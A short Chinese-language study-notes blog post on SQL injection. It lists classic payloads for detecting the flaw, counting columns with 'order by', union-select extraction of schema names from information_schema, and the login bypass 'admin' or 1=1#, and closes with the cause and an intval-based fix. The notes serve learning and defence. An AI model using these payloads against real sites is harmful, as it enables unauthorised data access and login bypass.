---

title: 学习笔记3--
date: 2020-09-14 17:43:35
categories: 笔记
description: 首先检测漏洞- 输入id=1，和id=1'观察区别- 通过 ’ 逃逸出去，将后面内容逃逸出，成为执行语句- 注释符   -- ，/**/，//，#。注释符之后的执行语句被视为注释，不会执行

---
# 学习笔记3

## 首先检测漏洞

- 输入id=1，和id=1'观察区别


```
/?id=1，/?id=1‘
```

```php+HTML
/?id=1’or1=1--+
```

- 通过 ’ 逃逸出去，将后面内容逃逸出，成为执行语句

- 注释符   -- ，/**/，//，#。注释符之后的执行语句被视为注释，不会执行


## 查找字段

```
/?id=1' order by 12--+
```

- ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。

- ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，可以使用 DESC 关键字。

```
order by A,B        这个时候都是默认按升序排列
order by A desc,B   这个时候 A 降序，B 升序排列
order by A ,B desc  这个时候 A 升序，B 降序排列
```

## 联合查询

- union select，联合查询


```
/?id=1' union select 1,2,3,4 --+
```

- 如果查询的不存在，下一个就会顶替上来，可以通过这个找出显著字段，控制它


```
/?id=-1' union select 1,2,3,4 --+
```

## 查找目标

- mysql5.7后存在总表 information_schema,通过总表进行查询


```
/?id=-1' union select 1,(select group_concat(schema_name) from information_schema. SCHEMATA),3,4 --+
```

- 通过可以显著字段，打印查询搜索的目标


## 漏洞原理

- $sql语句存在变量的拼接，可以被我们控制，变成其他内容


## 修复漏洞

- 通过强制转换为整数intval，过滤字符


## 免密码登录

- 就是通过sql注入的方式，用户名或id存在$sql变量拼接，（用户名无法通过强制转换为整数）


```
admin' or 1=1#
```


